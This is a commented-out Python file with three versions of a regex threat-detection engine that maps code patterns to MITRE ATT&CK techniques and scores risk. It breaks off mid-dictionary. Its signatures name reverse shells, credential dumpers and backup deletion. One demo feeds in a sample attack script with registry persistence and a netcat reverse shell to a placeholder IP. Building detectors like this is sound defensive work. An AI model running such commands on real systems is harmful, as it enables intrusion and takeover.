# import re
# import json

# class EnterpriseThreatEngine:
#     def __init__(self):
#         """
#         Initializes the Threat Engine with compiled Regex signatures.
#         Optimized for O(1) matching performance after initialization.
#         """
#         self.signatures = self._load_signatures()
#         self.compiled_patterns = self._compile_patterns()

#     def _load_signatures(self):
#         return {
#             # =================================================================
#             # 1. ENCRYPTION & RANSOMWARE (Impact)
#             # =================================================================
#             "T1486_Ransomware_Lib": {
#                 "pattern": r"\b(Fernet|pyAesCrypt|AES\.new|ChaCha20|BloodyCrypto)\b",
#                 "id": "T1486", "name": "Ransomware Encryption Logic", "severity": "Critical", "score": 100
#             },
#             "T1490_Inhibit_Recovery": {
#                 "pattern": r"(vssadmin\s+delete|wbadmin\s+delete|bcdedit\s+/set|Get-WmiObject Win32_Shadowcopy)",
#                 "id": "T1490", "name": "Shadow Copy/Backup Deletion", "severity": "Critical", "score": 100
#             },
#             "T1485_Disk_Wipe": {
#                 "pattern": r"(cipher\s+/w|shutil\.rmtree|fs\.unlink|dd\s+if=/dev/zero|Format-Volume)",
#                 "id": "T1485", "name": "Disk/File Wiping Activity", "severity": "High", "score": 90
#             },

#             # =================================================================
#             # 2. COMMAND & CONTROL (C2) - Multi-Protocol
#             # =================================================================
#             "T1095_Reverse_Shell_Nix": {
#                 "pattern": r"(nc\s+-e|/bin/bash\s+-i|bash\s+-c|socat\s+exec)",
#                 "id": "T1095", "name": "Linux Reverse Shell", "severity": "Critical", "score": 95
#             },
#             "T1095_Suspicious_Ports": {
#                 "pattern": r"(?<=[:\s])(4444|6667|1337|3389|8080|9001)(?=[:\s]|$)",
#                 "id": "T1095", "name": "Common C2/Exploit Port", "severity": "Medium", "score": 50
#             },
#             "T1071_Web_Protocols": {
#                 "pattern": r"\b(User-Agent:\s*BlackSun|User-Agent:\s*Nmap|curl\s+-A)",
#                 "id": "T1071", "name": "Suspicious User-Agent", "severity": "Medium", "score": 40
#             },
#             "T1572_Tunneling": {
#                 "pattern": r"\b(chisel|ngrok|frpc|dnscat|ptunnel)\b",
#                 "id": "T1572", "name": "Tunneling/Proxy Tool", "severity": "High", "score": 80
#             },

#             # =================================================================
#             # 3. EXECUTION - 20+ LANGUAGES
#             # =================================================================
#             # Python / Ruby / Perl
#             "T1059_Scripting_Exec": {
#                 "pattern": r"\b(os\.system|subprocess\.run|subprocess\.call|pty\.spawn|Kernel\.exec|system\s*\(|exec\s*\()",
#                 "id": "T1059.006", "name": "Scripting Command Execution", "severity": "High", "score": 75
#             },
#             # Node.js / JS
#             "T1059_Node_Exec": {
#                 "pattern": r"\b(child_process\.exec|spawnSync|eval\(|document\.write\()",
#                 "id": "T1059.007", "name": "JavaScript/Node Execution", "severity": "High", "score": 75
#             },
#             # PHP / Web Shells
#             "T1050_Web_Shell": {
#                 "pattern": r"\b(shell_exec|passthru|proc_open|pcntl_exec)\s*\(",
#                 "id": "T1505.003", "name": "PHP Web Shell Method", "severity": "Critical", "score": 100
#             },
#             # Java / C# / Compiled
#             "T1059_Compiled_Exec": {
#                 "pattern": r"\b(Runtime\.getRuntime|ProcessBuilder|System\.Diagnostics\.Process|std::process::Command)",
#                 "id": "T1059", "name": "Compiled Lang Process Spawn", "severity": "High", "score": 80
#             },
#             # Go / Rust / Swift
#             "T1059_Modern_Exec": {
#                 "pattern": r"\b(os/exec\.Command|syscall\.Exec|Process\(\)|NSTask)",
#                 "id": "T1059", "name": "Modern Lang System Call", "severity": "High", "score": 80
#             },

#             # =================================================================
#             # 4. PERSISTENCE & PRIVILEGE ESCALATION
#             # =================================================================
#             "T1547_Auto_Start": {
#                 "pattern": r"\b(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run|/etc/init\.d|/etc/cron|crontab\s+-e)",
#                 "id": "T1547", "name": "Startup Persistence Key", "severity": "Critical", "score": 90
#             },
#             "T1543_Service_Creation": {
#                 "pattern": r"(sc\.exe\s+create|New-Service|systemctl\s+enable)",
#                 "id": "T1543", "name": "Service Creation", "severity": "High", "score": 85
#             },
#             "T1053_Scheduled_Task": {
#                 "pattern": r"(schtasks\s+/create|Register-ScheduledTask|at\s+\d{2}:\d{2})",
#                 "id": "T1053", "name": "Scheduled Task Creation", "severity": "High", "score": 80
#             },

#             # =================================================================
#             # 5. CREDENTIAL ACCESS
#             # =================================================================
#             "T1003_Dump_Tools": {
#                 "pattern": r"\b(Mimikatz|Sekurlsa|procdump|sqldump|LaZagne)\b",
#                 "id": "T1003", "name": "Credential Dumping Utility", "severity": "Critical", "score": 100
#             },
#             "T1555_Keylogging": {
#                 "pattern": r"\b(GetAsyncKeyState|SetWindowsHookEx|pynput\.keyboard|IOHook)\b",
#                 "id": "T1056.001", "name": "Keylogging API", "severity": "High", "score": 90
#             },
#             "T1552_Hardcoded_Creds": {
#                 "pattern": r"(password\s*=\s*['\"].+['\"]|api_key\s*=\s*['\"].+['\"]|AWS_SECRET)",
#                 "id": "T1552", "name": "Potential Hardcoded Credential", "severity": "Medium", "score": 60
#             }
#         }

#     def _compile_patterns(self):
#         """Pre-compiles Regex patterns for performance."""
#         compiled = {}
#         for key, data in self.signatures.items():
#             try:
#                 # re.IGNORECASE makes it case-insensitive
#                 compiled[key] = re.compile(data['pattern'], re.IGNORECASE)
#             except re.error as e:
#                 print(f"[ERROR] Invalid Regex for {key}: {e}")
#         return compiled

#     def scan(self, code_snippet):
#         """
#         Scans code and returns a list of detailed findings.
#         """
#         findings = []
#         if not code_snippet:
#             return findings
            
#         for key, pattern in self.compiled_patterns.items():
#             if pattern.search(code_snippet):
#                 # We return the full metadata object, not just a string
#                 match_data = self.signatures[key].copy()
#                 match_data['signature_key'] = key
#                 findings.append(match_data)
#         return findings

#     def calculate_risk_matrix(self, findings):
#         """
#         Calculates a 'Kill Chain Score' based on internal logic.
#         Returns: (score, verdict_string)
#         """
#         if not findings:
#             return 0, "Clean"

#         base_score = sum(f['score'] for f in findings)
        
#         # Identify how many unique MITRE Tactics are involved
#         unique_tactics = set(f['id'].split('.')[0] for f in findings)
#         tactic_count = len(unique_tactics)
        
#         # Multiplier Logic: 
#         # 1 Tactic = 1.0x
#         # 2 Tactics = 1.25x
#         # 3+ Tactics = 1.5x (High confidence it's an attack chain)
#         multiplier = 1.0
#         if tactic_count == 2: multiplier = 1.25
#         elif tactic_count >= 3: multiplier = 1.5

#         final_score = int(min(base_score * multiplier, 100))
        
#         verdict = "Clean"
#         if final_score > 75: verdict = "CRITICAL THREAT"
#         elif final_score > 50: verdict = "Malicious"
#         elif final_score > 20: verdict = "Suspicious"
        
#         return final_score, verdict

# # Global Singleton Instance
# MITRE_ENGINE = EnterpriseThreatEngine()


# """
# MITRE ATT&CK THREAT INTELLIGENCE DATABASE (MASTER)
# Maps 100+ signatures across 25+ languages and file types (including Images) to standardized Tactic/Technique IDs.
# """

# MITRE_SIGNATURES = {
#     # =========================================================================
#     # 1. RANSOMWARE, CRYPTO & DESTRUCTIVE (Critical Threats)
#     # =========================================================================
#     "cryptography.fernet":  {"id": "T1486", "name": "Ransomware Encryption Lib", "severity": "Critical"},
#     "Fernet":               {"id": "T1486", "name": "Symmetric Encryption (Fernet)", "severity": "High"},
#     "pyAesCrypt":           {"id": "T1486", "name": "File Encryption Lib", "severity": "Critical"},
#     "vssadmin delete":      {"id": "T1490", "name": "Shadow Copy Deletion", "severity": "Critical"},
#     "wbadmin":              {"id": "T1490", "name": "Backup Deletion", "severity": "Critical"},
#     "cipher /w":            {"id": "T1485", "name": "Drive Wiping", "severity": "Critical"},
#     "shutil.rmtree":        {"id": "T1485", "name": "Recursive File Deletion", "severity": "High"},
#     "fs.unlink":            {"id": "T1070.004", "name": "File Deletion", "severity": "Medium"},
#     "os.walk":              {"id": "T1083", "name": "File System Traversal", "severity": "Low"}, 
#     "chisel":               {"id": "T1090", "name": "Tunneling Tool (Chisel)", "severity": "High"},
#     "ngrok":                {"id": "T1090", "name": "Tunneling Tool (Ngrok)", "severity": "High"},

#     # =========================================================================
#     # 2. IMAGE & STEGANOGRAPHY THREATS (New Section)
#     # =========================================================================
#     "LSB DATA":             {"id": "T1027.003", "name": "Steganography (LSB Anomaly)", "severity": "High"},
#     "steghide":             {"id": "T1027.003", "name": "Steganography Tool (Steghide)", "severity": "High"},
#     "openstego":            {"id": "T1027.003", "name": "Steganography Tool (OpenStego)", "severity": "High"},
#     "outguess":             {"id": "T1027.003", "name": "OutGuess Stego Tool", "severity": "High"},
#     "JPHide":               {"id": "T1027.003", "name": "JPHide Stego Artifact", "severity": "High"},
#     "image/php":            {"id": "T1505.003", "name": "Polyglot Image (PHP Web Shell)", "severity": "Critical"},
#     "exiftool":             {"id": "T1005", "name": "Metadata Manipulation Tool", "severity": "Medium"},

#     # =========================================================================
#     # 3. SYSTEM COMMANDS & EXECUTION (Multi-Language)
#     # =========================================================================
#     "system(":              {"id": "T1059", "name": "System Command Execution", "severity": "High"}, 
#     "popen(":               {"id": "T1059", "name": "Pipe Open Command", "severity": "High"},
#     "execve(":              {"id": "T1059", "name": "Process Execution (execve)", "severity": "Critical"},
#     "os.system":            {"id": "T1059.006", "name": "Python System Cmd", "severity": "Critical"},
#     "subprocess.call":      {"id": "T1059.006", "name": "Python Subprocess", "severity": "High"},
#     "pty.spawn":            {"id": "T1059.006", "name": "Python PTY Spawn (Shell)", "severity": "Critical"},
#     "os.execute":           {"id": "T1059", "name": "Lua OS Execute", "severity": "High"},
#     "io.popen":             {"id": "T1059", "name": "Lua IO Popen", "severity": "High"},
#     "syscall":              {"id": "T1059", "name": "Syscall Execution", "severity": "High"},
#     "exec(":                {"id": "T1059", "name": "Generic Exec Command", "severity": "High"},
#     "eval(":                {"id": "T1059", "name": "Dynamic Code Execution (Eval)", "severity": "High"},

#     # =========================================================================
#     # 4. WEB & SCRIPTING THREATS (PHP, JS, Node, ASP)
#     # =========================================================================
#     "shell_exec":           {"id": "T1059.003", "name": "PHP Shell Exec", "severity": "Critical"},
#     "passthru":             {"id": "T1059.003", "name": "PHP Passthru", "severity": "High"},
#     "child_process":        {"id": "T1059", "name": "NodeJS Child Process", "severity": "High"},
#     "UNION SELECT":         {"id": "T1190", "name": "SQL Injection Pattern", "severity": "Critical"},
#     "OR 1=1":               {"id": "T1190", "name": "SQL Injection Bypass", "severity": "Critical"},
#     "xp_cmdshell":          {"id": "T1059.003", "name": "MSSQL Command Shell", "severity": "Critical"},
#     "<script>":             {"id": "T1190", "name": "Cross-Site Scripting (XSS)", "severity": "High"},
#     "<!ENTITY":             {"id": "T1190", "name": "XXE Injection", "severity": "High"},
#     "../../":               {"id": "T1006", "name": "Path Traversal", "severity": "High"},

#     # =========================================================================
#     # 5. MEMORY & BINARY EXPLOITS (C/C++, Windows API)
#     # =========================================================================
#     "strcpy(":              {"id": "T1190", "name": "Buffer Overflow Risk (strcpy)", "severity": "Medium"},
#     "strcat(":              {"id": "T1190", "name": "Buffer Overflow Risk (strcat)", "severity": "Medium"},
#     "gets(":                {"id": "T1190", "name": "Banned Function (gets)", "severity": "High"},
#     "memcpy(":              {"id": "T1190", "name": "Memory Copy (Potential Overflow)", "severity": "Low"},
#     "mprotect":             {"id": "T1055", "name": "Memory Protection Change (RWX)", "severity": "Critical"},
#     "VirtualAlloc":         {"id": "T1055", "name": "Memory Allocation (Injection)", "severity": "Critical"},
#     "CreateRemoteThread":   {"id": "T1055", "name": "Thread Injection", "severity": "Critical"},
#     "ptrace":               {"id": "T1055", "name": "Process Debugging/Injection", "severity": "High"},
#     "LD_PRELOAD":           {"id": "T1574.006", "name": "Shared Object Injection", "severity": "Critical"},
#     "pickle.loads":         {"id": "T1203", "name": "Python Pickle Deserialization", "severity": "Critical"},
#     "loadlibrary":          {"id": "T1106", "name": "DLL Loading", "severity": "Medium"},

#     # =========================================================================
#     # 6. COMPILED LANGUAGES (Java, Go, Rust, .NET)
#     # =========================================================================
#     "Runtime.getRuntime":   {"id": "T1059", "name": "Java Runtime Exec", "severity": "Critical"},
#     "ProcessBuilder":       {"id": "T1059", "name": "Java ProcessBuilder", "severity": "High"},
#     "os/exec":              {"id": "T1059", "name": "Go Command Exec", "severity": "High"},
#     "std::process":         {"id": "T1059", "name": "Rust Command Exec", "severity": "High"},
#     "Process.Start":        {"id": "T1059", "name": ".NET Process Start", "severity": "High"},
#     "Process()":            {"id": "T1059", "name": "Swift Process", "severity": "High"},

#     # =========================================================================
#     # 7. SHELL & MACROS (PowerShell, VBA, Bash)
#     # =========================================================================
#     "Invoke-Expression":    {"id": "T1059.001", "name": "PowerShell IEX", "severity": "Critical"},
#     "cmd.exe":              {"id": "T1059.003", "name": "Windows Command Prompt", "severity": "Medium"},
#     "AutoOpen":             {"id": "T1204.002", "name": "VBA Macro AutoRun", "severity": "Critical"},
#     "Document_Open":        {"id": "T1204.002", "name": "VBA Document Open", "severity": "Critical"},
    
#     # =========================================================================
#     # 8. NETWORK, C2 & PORTS
#     # =========================================================================
#     "4444":                 {"id": "T1095", "name": "Metasploit Default Port", "severity": "Critical"},
#     "6667":                 {"id": "T1132.001", "name": "IRC Botnet Port", "severity": "High"},
#     "1337":                 {"id": "T1095", "name": "Leet/Hacker Port", "severity": "Medium"},
#     "3389":                 {"id": "T1021.001", "name": "RDP Access", "severity": "Medium"},
#     "23":                   {"id": "T1014", "name": "Telnet Cleartext", "severity": "High"},
#     "socket":               {"id": "T1095", "name": "Raw Socket Connection", "severity": "Medium"},
#     "nc -e":                {"id": "T1095", "name": "Netcat Reverse Shell", "severity": "Critical"},
#     "meterpreter":          {"id": "T1095", "name": "Meterpreter Payload", "severity": "Critical"},
#     "empire":               {"id": "T1095", "name": "Empire C2 Agent", "severity": "Critical"},

#     # =========================================================================
#     # 9. CREDENTIAL THEFT
#     # =========================================================================
#     "Mimikatz":             {"id": "T1003", "name": "Credential Dumping", "severity": "Critical"},
#     "samdump":              {"id": "T1003", "name": "SAM Hive Dumping", "severity": "Critical"},
#     "lsass":                {"id": "T1003.001", "name": "LSASS Memory Access", "severity": "Critical"},
#     "keylog":               {"id": "T1056.001", "name": "Keylogging Activity", "severity": "High"},
#     "GetAsyncKeyState":     {"id": "T1056.001", "name": "Keystroke Capture", "severity": "High"},

#     # =========================================================================
#     # 10. GENERAL OBFUSCATION & EVASION
#     # =========================================================================
#     "base64":               {"id": "T1027", "name": "Base64 Encoding", "severity": "Low"},
#     "base64_decode":        {"id": "T1027", "name": "Obfuscated Payload", "severity": "Medium"},
#     "rot13":                {"id": "T1027", "name": "Simple Cipher", "severity": "Low"},
#     "UPX":                  {"id": "T1027.002", "name": "Binary Packing (UPX)", "severity": "High"},
#     "flag{":                {"id": "T1027.003", "name": "CTF/Stego Flag", "severity": "Medium"},
#     "system2(":             {"id": "T1059", "name": "R System2 Command", "severity": "High"},
#     "unix(":                {"id": "T1059.004", "name": "MATLAB Unix Cmd", "severity": "High"},
#     "dos(":                 {"id": "T1059.003", "name": "MATLAB DOS Cmd", "severity": "High"}
# }

# def get_mitre_tag(keyword, specific_msg=None):
#     """
#     Returns a formatted MITRE string: '[T1059] Command Execution: specific_msg'
#     """
#     # 1. Direct Keyword Match
#     for sig, info in MITRE_SIGNATURES.items():
#         if sig.lower() in keyword.lower():
#             desc = specific_msg if specific_msg else info['name']
#             return f"[{info['id']}] {desc}"
    
#     # 2. Heuristic/Fallback Matching
#     return f"[GENERIC] {specific_msg or keyword}"

# def get_risk_score(behaviors):
#     """
#     Calculates score based on Weighted MITRE Severity.
#     """
#     score = 0
#     unique_behaviors = set(behaviors)
    
#     for b in unique_behaviors:
#         for sig, info in MITRE_SIGNATURES.items():
#             if info['id'] in b:
#                 if info['severity'] == "Critical": score += 40
#                 elif info['severity'] == "High": score += 20
#                 elif info['severity'] == "Medium": score += 10
#                 else: score += 5
#                 break 
    
#     return min(score, 100)

#----------->2nd version #
# import re
# import json

# class EnterpriseThreatEngine:
#     def __init__(self):
#         """
#         Initializes the Threat Engine with compiled Regex signatures.
#         Optimized for O(1) matching performance after initialization.
#         """
#         self.signatures = self._load_signatures()
#         self.compiled_patterns = self._compile_patterns()

#     def _load_signatures(self):
#         return {
#             # =================================================================
#             # 1. ENCRYPTION & RANSOMWARE (Impact)
#             # =================================================================
#             "T1486_Ransomware_Lib": {
#                 "pattern": r"\b(Fernet|pyAesCrypt|AES\.new|ChaCha20|BloodyCrypto)\b",
#                 "id": "T1486", "name": "Ransomware Encryption Logic", "severity": "Critical", "score": 40
#             },
#             "T1490_Inhibit_Recovery": {
#                 "pattern": r"(vssadmin\s+delete|wbadmin\s+delete|bcdedit\s+/set|Get-WmiObject Win32_Shadowcopy)",
#                 "id": "T1490", "name": "Shadow Copy/Backup Deletion", "severity": "Critical", "score": 50
#             },
#             "T1485_Disk_Wipe": {
#                 "pattern": r"(cipher\s+/w|shutil\.rmtree|fs\.unlink|dd\s+if=/dev/zero|Format-Volume)",
#                 "id": "T1485", "name": "Disk/File Wiping Activity", "severity": "High", "score": 35
#             },

#             # =================================================================
#             # 2. COMMAND & CONTROL (C2) - Multi-Protocol
#             # =================================================================
#             "T1095_Reverse_Shell_Nix": {
#                 "pattern": r"(nc\s+-e|/bin/bash\s+-i|bash\s+-c|socat\s+exec)",
#                 "id": "T1095", "name": "Linux Reverse Shell", "severity": "Critical", "score": 45
#             },
#             "T1095_Suspicious_Ports": {
#                 "pattern": r"(?<=[:\s])(4444|6667|1337|3389|8080|9001)(?=[:\s]|$)",
#                 "id": "T1095", "name": "Common C2/Exploit Port", "severity": "Medium", "score": 15
#             },
#             "T1071_Web_Protocols": {
#                 "pattern": r"\b(User-Agent:\s*BlackSun|User-Agent:\s*Nmap|curl\s+-A)",
#                 "id": "T1071", "name": "Suspicious User-Agent", "severity": "Medium", "score": 10
#             },
#             "T1572_Tunneling": {
#                 "pattern": r"\b(chisel|ngrok|frpc|dnscat|ptunnel)\b",
#                 "id": "T1572", "name": "Tunneling/Proxy Tool", "severity": "High", "score": 30
#             },

#             # =================================================================
#             # 3. EXECUTION - 20+ LANGUAGES
#             # =================================================================
#             # Python / Ruby / Perl
#             "T1059_Scripting_Exec": {
#                 "pattern": r"\b(os\.system|subprocess\.run|subprocess\.call|pty\.spawn|Kernel\.exec|system\s*\(|exec\s*\()",
#                 "id": "T1059.006", "name": "Scripting Command Execution", "severity": "High", "score": 25
#             },
#             # Node.js / JS
#             "T1059_Node_Exec": {
#                 "pattern": r"\b(child_process\.exec|spawnSync|eval\(|document\.write\()",
#                 "id": "T1059.007", "name": "JavaScript/Node Execution", "severity": "High", "score": 25
#             },
#             # PHP / Web Shells
#             "T1050_Web_Shell": {
#                 "pattern": r"\b(shell_exec|passthru|proc_open|pcntl_exec)\s*\(",
#                 "id": "T1505.003", "name": "PHP Web Shell Method", "severity": "Critical", "score": 40
#             },
#             # Java / C# / Compiled
#             "T1059_Compiled_Exec": {
#                 "pattern": r"\b(Runtime\.getRuntime|ProcessBuilder|System\.Diagnostics\.Process|std::process::Command)",
#                 "id": "T1059", "name": "Compiled Lang Process Spawn", "severity": "High", "score": 20
#             },
#             # Go / Rust / Swift
#             "T1059_Modern_Exec": {
#                 "pattern": r"\b(os/exec\.Command|syscall\.Exec|Process\(\)|NSTask)",
#                 "id": "T1059", "name": "Modern Lang System Call", "severity": "High", "score": 20
#             },

#             # =================================================================
#             # 4. PERSISTENCE & PRIVILEGE ESCALATION
#             # =================================================================
#             "T1547_Auto_Start": {
#                 "pattern": r"\b(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run|/etc/init\.d|/etc/cron|crontab\s+-e)",
#                 "id": "T1547", "name": "Startup Persistence Key", "severity": "Critical", "score": 35
#             },
#             "T1543_Service_Creation": {
#                 "pattern": r"(sc\.exe\s+create|New-Service|systemctl\s+enable)",
#                 "id": "T1543", "name": "Service Creation", "severity": "High", "score": 30
#             },
#             "T1053_Scheduled_Task": {
#                 "pattern": r"(schtasks\s+/create|Register-ScheduledTask|at\s+\d{2}:\d{2})",
#                 "id": "T1053", "name": "Scheduled Task Creation", "severity": "High", "score": 25
#             },

#             # =================================================================
#             # 5. CREDENTIAL ACCESS
#             # =================================================================
#             "T1003_Dump_Tools": {
#                 "pattern": r"\b(Mimikatz|Sekurlsa|procdump|sqldump|LaZagne)\b",
#                 "id": "T1003", "name": "Credential Dumping Utility", "severity": "Critical", "score": 50
#             },
#             "T1555_Keylogging": {
#                 "pattern": r"\b(GetAsyncKeyState|SetWindowsHookEx|pynput\.keyboard|IOHook)\b",
#                 "id": "T1056.001", "name": "Keylogging API", "severity": "High", "score": 30
#             },
#             "T1552_Hardcoded_Creds": {
#                 "pattern": r"(password\s*=\s*['\"].+['\"]|api_key\s*=\s*['\"].+['\"]|AWS_SECRET)",
#                 "id": "T1552", "name": "Potential Hardcoded Credential", "severity": "Medium", "score": 15
#             }
#         }

#     def _compile_patterns(self):
#         """Pre-compiles Regex patterns for performance."""
#         compiled = {}
#         for key, data in self.signatures.items():
#             try:
#                 # re.IGNORECASE makes it case-insensitive
#                 compiled[key] = re.compile(data['pattern'], re.IGNORECASE)
#             except re.error as e:
#                 print(f"[ERROR] Invalid Regex for {key}: {e}")
#         return compiled

#     def scan(self, code_snippet):
#         """
#         Scans code and returns a list of detailed findings.
#         """
#         findings = []
#         for key, pattern in self.compiled_patterns.items():
#             if pattern.search(code_snippet):
#                 # We return the full metadata object, not just a string
#                 match_data = self.signatures[key].copy()
#                 match_data['signature_key'] = key
#                 findings.append(match_data)
#         return findings

#     def calculate_risk_matrix(self, findings):
#         """
#         Calculates a 'Kill Chain Score'. 
#         If a script has Execution + Persistence + C2, it is exponentially more dangerous.
#         """
#         if not findings:
#             return 0, "Clean"

#         base_score = sum(f['score'] for f in findings)
        
#         # Identify how many unique MITRE Tactics are involved
#         unique_tactics = set(f['id'].split('.')[0] for f in findings)
#         tactic_count = len(unique_tactics)
        
#         # Multiplier Logic: 
#         # 1 Tactic = 1.0x
#         # 2 Tactics = 1.25x
#         # 3+ Tactics = 1.5x (High confidence it's an attack chain)
#         multiplier = 1.0
#         if tactic_count == 2: multiplier = 1.25
#         elif tactic_count >= 3: multiplier = 1.5

#         final_score = int(min(base_score * multiplier, 100))
        
#         verdict = "Clean"
#         if final_score > 75: verdict = "CRITICAL THREAT"
#         elif final_score > 50: verdict = "Malicious"
#         elif final_score > 20: verdict = "Suspicious"
        
#         return final_score, verdict

# # =============================================================================
# # DEMO: RUNNING THE SENIOR EXPERT ENGINE
# # =============================================================================

# if __name__ == "__main__":
#     engine = EnterpriseThreatEngine()

#     # TEST CASE: A Complex Python Attack Script
#     # Contains: Persistence (Reg Key), Execution (os.system), and C2 (Netcat)
#     malicious_code = """
#     import os
#     import winreg
    
#     def startup():
#         # T1547: Persistence
#         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
#         winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, "c:\\evil.exe")
        
#     def shell():
#         # T1059 + T1095: Execution + C2
#         os.system("nc -e /bin/bash 10.10.10.10 4444")
        
#     startup()
#     """

#     print("--- STARTING DEEP SCAN ---")
#     hits = engine.scan(malicious_code)
#     score, verdict = engine.calculate_risk_matrix(hits)

#     print(f"\n[SCAN RESULT]")
#     print(f"Risk Score: {score}/100")
#     print(f"Verdict:    {verdict}")
#     print(f"Tactics ID: {len(hits)} Signatures Matched")
#     print("-" * 40)
    
#     for h in hits:
#         print(f"[{h['id']}] {h['name']}")
#         print(f"   Severity: {h['severity']} | Score: +{h['score']}")

# currently using this <--------------
# import re
# import json

# class EnterpriseThreatEngine:
#     """
#     CYBERSENTINEL THREAT ENGINE (MASTER V5.0)
#     -----------------------------------------
#     High-Performance O(1) detection engine mapping 150+ unique signatures 
#     across Source Code, Binaries, Network, and Steganography.
#     """
    
#     def __init__(self):
#         """
#         Initializes the Threat Engine.
#         Compiles all 150+ Regex signatures into memory for fast matching.
#         """
#         self.signatures = self._load_signatures()
#         self.compiled_patterns = self._compile_patterns()

#     def _load_signatures(self):
#         """
#         The Master Database of Threat Signatures.
#         """
#         return {
#             # =================================================================
#             # 1. RANSOMWARE, CRYPTO & DESTRUCTIVE (Critical)
#             # =================================================================
#             "T1486_Fernet":         {"id": "T1486", "name": "Ransomware Encryption Lib", "severity": "Critical", "score": 100, "pattern": r"\b(cryptography\.fernet|Fernet|pyAesCrypt|AES\.new|ChaCha20|BloodyCrypto)\b"},
#             "T1490_Shadows":        {"id": "T1490", "name": "Shadow Copy Deletion", "severity": "Critical", "score": 100, "pattern": r"(vssadmin.*delete|wbadmin.*delete|bcdedit.*recoveryenabled)"},
#             "T1485_Wipe":           {"id": "T1485", "name": "Disk/File Wiping", "severity": "Critical", "score": 95, "pattern": r"(cipher\s+/w|shutil\.rmtree|fs\.unlink|Format-Volume|dd\s+if=/dev/zero)"},
#             "T1496_Miner":          {"id": "T1496", "name": "Cryptojacking Miner", "severity": "High", "score": 85, "pattern": r"(CoinHive|XMRig|Stratum\+TCP|cryptonight|minerd)"},
#             "T1486_BitLocker":      {"id": "T1486", "name": "BitLocker Manipulation", "severity": "High", "score": 90, "pattern": r"(manage-bde|BitLocker|Enable-BitLocker)"},

#             # =================================================================
#             # 2. COMMAND & CONTROL (C2) - NETWORK FORENSICS
#             # =================================================================
#             "T1095_RevShell":       {"id": "T1095", "name": "Reverse Shell", "severity": "Critical", "score": 100, "pattern": r"(nc\s+-e|/bin/bash\s+-i|bash\s+-c|socat\s+exec|setsockopt|socket\.socket)"},
#             "T1071_UserAgent":      {"id": "T1071", "name": "Suspicious User-Agent", "severity": "Medium", "score": 50, "pattern": r"(User-Agent:\s*(BlackSun|Nmap|Sqlmap|Nikto)|curl\s+-A)"},
#             "T1090_Tunneling":      {"id": "T1090", "name": "Tunneling Tool", "severity": "High", "score": 85, "pattern": r"\b(chisel|ngrok|frpc|dnscat|ptunnel|ligolo)\b"},
#             "T1095_C2_Ports":       {"id": "T1095", "name": "C2/Exploit Port", "severity": "High", "score": 75, "pattern": r"(?<=[:\s])(4444|6667|1337|3389|8080|9001|23)(?=[:\s]|$)"},
#             "T1095_Meterpreter":    {"id": "T1095", "name": "Meterpreter Payload", "severity": "Critical", "score": 100, "pattern": r"(meterpreter|reverse_tcp|reverse_http|empire agent)"},

#             # =================================================================
#             # 3. EXECUTION - MULTI-LANGUAGE
#             # =================================================================
#             "T1059_PyExec":         {"id": "T1059.006", "name": "Python Execution", "severity": "High", "score": 75, "pattern": r"\b(os\.system|subprocess\.run|subprocess\.call|pty\.spawn|exec\()"},
#             "T1059_JSExec":         {"id": "T1059.007", "name": "Node/JS Execution", "severity": "High", "score": 75, "pattern": r"\b(child_process\.exec|spawnSync|eval\(|document\.write\()"},
#             "T1505_PHPExec":        {"id": "T1505.003", "name": "PHP Web Shell", "severity": "Critical", "score": 95, "pattern": r"\b(shell_exec|passthru|proc_open|pcntl_exec|system\()\b"},
#             "T1059_Compiled":       {"id": "T1059", "name": "Compiled Execution (C/Java/Go)", "severity": "High", "score": 80, "pattern": r"\b(Runtime\.getRuntime|ProcessBuilder|os/exec\.Command|syscall\.Exec|std::process|WinExec|ShellExecute)"},
#             "T1059_PowerShell":     {"id": "T1059.001", "name": "PowerShell Execution", "severity": "Critical", "score": 90, "pattern": r"(Invoke-Expression|IEX|EncodedCommand|FromBase64String)"},

#             # =================================================================
#             # 4. PERSISTENCE & PRIVILEGE ESCALATION
#             # =================================================================
#             "T1547_Registry":       {"id": "T1547", "name": "Registry Persistence", "severity": "Critical", "score": 90, "pattern": r"(CurrentVersion\\\\Run|RegSetValue|HKCU\\\\Software)"},
#             "T1543_Service":        {"id": "T1543", "name": "Service Creation", "severity": "High", "score": 85, "pattern": r"(sc\.exe\s+create|New-Service|systemctl\s+enable|/etc/init\.d)"},
#             "T1053_Cron":           {"id": "T1053", "name": "Scheduled Task/Cron", "severity": "High", "score": 80, "pattern": r"(schtasks|Register-ScheduledTask|crontab\s+-e|/etc/cron)"},
#             "T1548_UAC":            {"id": "T1548", "name": "UAC Bypass", "severity": "High", "score": 85, "pattern": r"(fodhelper\.exe|eventvwr\.exe|sdclt\.exe|bypassuac)"},
#             "T1574_Hijack":         {"id": "T1574", "name": "DLL/Lib Hijacking", "severity": "Critical", "score": 90, "pattern": r"(LD_PRELOAD|SetDllDirectory|loadlibrary)"},

#             # =================================================================
#             # 5. CREDENTIAL ACCESS & CLOUD
#             # =================================================================
#             "T1003_Dumpers":        {"id": "T1003", "name": "Credential Dumping Tool", "severity": "Critical", "score": 100, "pattern": r"\b(Mimikatz|Sekurlsa|procdump|sqldump|LaZagne|hashcat|JohnTheRipper)\b"},
#             "T1056_Keylog":         {"id": "T1056", "name": "Keylogging Activity", "severity": "High", "score": 90, "pattern": r"(GetAsyncKeyState|SetWindowsHookEx|pynput\.keyboard|IOHook|GetKeyboardState)"},
#             "T1552_Secrets":        {"id": "T1552", "name": "Hardcoded Secrets", "severity": "High", "score": 75, "pattern": r"(AKIA[0-9A-Z]{16}|BEGIN PRIVATE KEY|api_key\s*=|password\s*=|AWS_SECRET)"},
#             "T1552_CloudMeta":      {"id": "T1552", "name": "Cloud Metadata Theft", "severity": "High", "score": 90, "pattern": r"(169\.254\.169\.254|metadata\.google\.internal|s3://|blob\.core\.windows)"},

#             # =================================================================
#             # 6. INJECTION, MEMORY & BINARY EXPLOITS
#             # =================================================================
#             "T1055_Injection":      {"id": "T1055", "name": "Process/Memory Injection", "severity": "Critical", "score": 100, "pattern": r"(VirtualAlloc|CreateRemoteThread|WriteProcessMemory|mprotect|ptrace|RtlMoveMemory)"},
